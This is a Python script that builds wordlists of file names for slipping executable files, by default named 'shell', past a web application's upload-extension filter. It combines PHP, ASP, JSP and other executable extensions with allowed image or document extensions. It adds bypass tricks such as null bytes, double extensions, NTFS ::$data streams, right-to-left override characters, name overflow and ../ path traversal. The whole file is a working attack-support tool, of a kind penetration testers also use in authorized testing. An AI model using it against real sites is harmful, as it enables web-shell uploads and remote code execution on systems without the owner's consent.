#!/usr/bin/python3

import argparse
import random
import sys

EXTENSIONS = {
    "allow_list": ["jpg", "jpeg", "png", "gif", "pdf", "mp3", "mp4", "txt", "csv", "svg", "xml", "xlsx",
                   "webp", "bmp", "tiff", "docx", "zip", "json"],
    "php": ["php", "php3", "phar", "phtml", "php5", "php6", "php7", "php8", "phps", "pht", "phtm", "phpt", "php4",
            "pgif", "php2", "inc", "hphp", "ctp", "module"],
    "asp": ["asp", "aspx", "config", "ashx", "asmx", "aspq", "axd", "cshtm", "cshtml", "rem", "soap",
            "vbhtm", "vbhtml", "asa", "cer", "shtml", "xamlx", "shtm", "stm"],
    "jsp": ["jsp", "jspx", "jsw", "jsv", "jspf", "wss", "do", "action", "actions"],
    "java": ["jar", "war", "ear"],
    "coldfusion": ["cfm", "cfml", "cfc", "dbm", "cFm", "cFml", "cFc", "dBm"],
    "perl": ["pl", "cgi", "pm", "lib"],
    "python": ["py", "pyc", "pyw", "pyz", "wsgi", "cgi"],
    "ruby": ["rb", "rhtml", "erb", "ru", "cgi"],
    "node": ["js", "json", "node"],
    "flash": ["swf"],
    "erlang": ["yaws"],
}

TRAILING = [".", " ", "%20", "%00", "....", "%0a", "%0d%0a", "/", ".\\", "%2e",
            "<", ">", '"', "/././././."]

NULL_BYTES = ['\x00', ";", "%20", "%0a", "%00", "%0d%0a", "/", ".\\", ".", "....", "#", "%23", "?", ":", ";1"]


class HelpFormatter(argparse.HelpFormatter):
    def __init__(self, prog):
        super().__init__(prog, max_help_position=40, width=160)

    def add_argument(self, action):
        super().add_argument(action)
        self._action_max_length = max(self._action_max_length, 31)


def capitalise_random(word):
    return "".join(random.choice([c.upper(), c.lower()]) for c in word)


def dedup(items):
    seen, ordered = set(), []
    for i in items:
        if i not in seen:
            seen.add(i)
            ordered.append(i)
    return ordered


BYPASS_TOKENS = [t for t in dedup(
    TRAILING + NULL_BYTES + [
        "%2e", "%252e",
        "::$data", "::$data.",
        "%E2%80%AE",
        "^", "\\",
        "../", "..%2f",
    ]
) if t != "\x00"]


def write_lines(path, items, label):
    with open(path, "w") as f:
        f.write("\n".join(items) + "\n")
    print(f"[*] {label} ({len(items)}) saved to '{path}'")


def build_names(exts, allowed_list, base, is_php, overflow):
    names = []

    for ext in exts:
        names.append(f"{base}.{ext}")
        names.append(f"{base}.{capitalise_random(ext)}")
        names.append(f"{base}.{ext}.{ext}")
        names.append(f"{base}.{ext}.{capitalise_random(ext)}")
        names.append(f"{base}.{ext[0]}.{ext}{ext[1:]}")
        names.append(f"{base}.{ext[0]}{ext}{ext[1:]}")
        names.append(f"{base}%2e{ext}")
        names.append(f"{base}%252e{ext}")
        for allowed in allowed_list:
            names.append(f"{base}.{allowed}.{ext}")
            names.append(f"{base}.{ext}.{allowed}")

    for ext in exts:
        for nb in NULL_BYTES:
            for allowed in allowed_list:
                names.append(f"{base}.{ext}{nb}.{allowed}")

    for ext in exts:
        for allowed in allowed_list:
            names.append(("A" * max(0, overflow - (len(ext) + 1))) + f".{ext}.{allowed}")

    for ext in exts:
        names.append(f"{base}.{ext}::$data")
        names.append(f"{base}.{ext}::$data.")
        for allowed in allowed_list:
            names.append(f"{base}.%E2%80%AE{ext}.{allowed}")
            names.append(f"{base}.{allowed}^{base}.{ext}")

    for ext in exts:
        for t in TRAILING:
            names.append(f"{base}.{ext}{t}")

    for ext in exts:
        if len(ext) > 1:
            names.append(f"{base}.{ext[0]}/{ext[1:]}")
            names.append(f"{base}.{ext[0]}\\{ext[1:]}")

    names.append(f"{base}.svg")

    if is_php:
        names.append(".htaccess")
        names.append(f"{base}.arbit")
        names.append(f"../{base}.php")
        names.append(f"..%2f{base}.php")

    seen, ordered = set(), []
    for n in names:
        if n not in seen:
            seen.add(n)
            ordered.append(n)
    return ordered


def main():
    ap = argparse.ArgumentParser(add_help=False, formatter_class=HelpFormatter)
    families = [k for k in EXTENSIONS if k not in ("allow_list", "com")]
    g_gen = ap.add_argument_group("general")
    g_gen.add_argument("-h", "--help", action="help", default=argparse.SUPPRESS,
                       help="Show this help message")

    g_ext = ap.add_argument_group("executable extension")
    g_ext.add_argument("-E", "--extension", default=None, metavar="EXTENSION",
                       help="Extension of the file you want to execute, a family or comma-separated (e.g. php or jar,war)")
    g_ext.add_argument("--all-extensions", action="store_true",
                       help="Use every available executable extension to build the wordlist")
    g_ext.add_argument("--list-extensions", action="store_true",
                       help="List the available extensions")
    g_ext.add_argument("--save-extensions", default=None, metavar="FILE",
                       help="Save the executable extensions as a flat list (one per line)")
    g_ext.add_argument("--overflow-length", type=int, default=255, metavar="N",
                       help="Truncation length for the name-overflow trick (e.g. 255 filesystem, 236 wget), default 255")

    g_allow = ap.add_argument_group("allowed extension")
    g_allow.add_argument("-A", "--allowed", default=None, metavar="EXTENSION",
                         help="Extension the app accepts, one or comma-separated (e.g. jpeg or jpeg,png)")
    g_allow.add_argument("--all-allowed-extensions", action="store_true",
                         help="Use every available allowed extension to build the wordlist")
    g_allow.add_argument("--list-allowed-extensions", action="store_true",
                         help="List the allowed extensions")
    g_allow.add_argument("--save-allowed-extensions", default=None, metavar="FILE",
                         help="Save the allowed extensions as a flat list (one per line)")

    g_byp = ap.add_argument_group("bypasses")
    g_byp.add_argument("--save-bypasses", default=None, metavar="FILE",
                       help="Save the bypass tokens (%%00, %%2e, ::$data, ...) as a flat list, one per line")

    g_out = ap.add_argument_group("output")
    g_out.add_argument("-n", "--filename", default="shell", metavar="FILENAME",
                       help="Base filename (e.g. -n avatar), default shell")
    g_out.add_argument("-o", "--output", default=None, metavar="OUTPUT",
                       help="Save the list to a file (e.g. -o names.txt), otherwise printed to stdout")
    args = ap.parse_args()

    random.seed(0)

    if args.list_extensions:
        for fam in families:
            print(f"{fam}: {', '.join(EXTENSIONS[fam])}")
        return
    if args.list_allowed_extensions:
        print(", ".join(EXTENSIONS["allow_list"]))
        return

    all_exec = dedup(e for fam in families for e in EXTENSIONS[fam])

    did_bare = False
    if args.save_extensions:
        write_lines(args.save_extensions, all_exec, "Executable extensions")
        did_bare = True
    if args.save_allowed_extensions:
        write_lines(args.save_allowed_extensions, EXTENSIONS["allow_list"], "Allowed extensions")
        did_bare = True
    if args.save_bypasses:
        write_lines(args.save_bypasses, BYPASS_TOKENS, "Bypass tokens")
        did_bare = True
    if did_bare:
        return

    if not args.extension and not args.all_extensions:
        ap.error("provide -E <extension/family> or use --all-extensions  (--list-extensions to see them)")
    if not args.allowed and not args.all_allowed_extensions:
        ap.error("provide -A <allowed-extension> or use --all-allowed-extensions  (--list-allowed-extensions to see them)")

    if args.all_extensions:
        exts = all_exec
        is_php = True
    elif args.extension in EXTENSIONS and args.extension not in ("allow_list", "com"):
        exts = EXTENSIONS[args.extension]
        is_php = args.extension == "php"
    else:
        exts = [e.strip().lstrip(".") for e in args.extension.split(",") if e.strip()]
        is_php = "php" in exts

    if args.all_allowed_extensions:
        allowed_list = EXTENSIONS["allow_list"]
    else:
        allowed_list = [a.strip().lstrip(".") for a in args.allowed.split(",") if a.strip()]

    names = build_names(exts, allowed_list, args.filename, is_php, args.overflow_length)
    text = "\n".join(names) + "\n"
    if args.output:
        with open(args.output, "w") as f:
            f.write(text)
        print(f"[*] Content saved to '{args.output}'")
    else:
        sys.stdout.write(text)


if __name__ == "__main__":
    main()
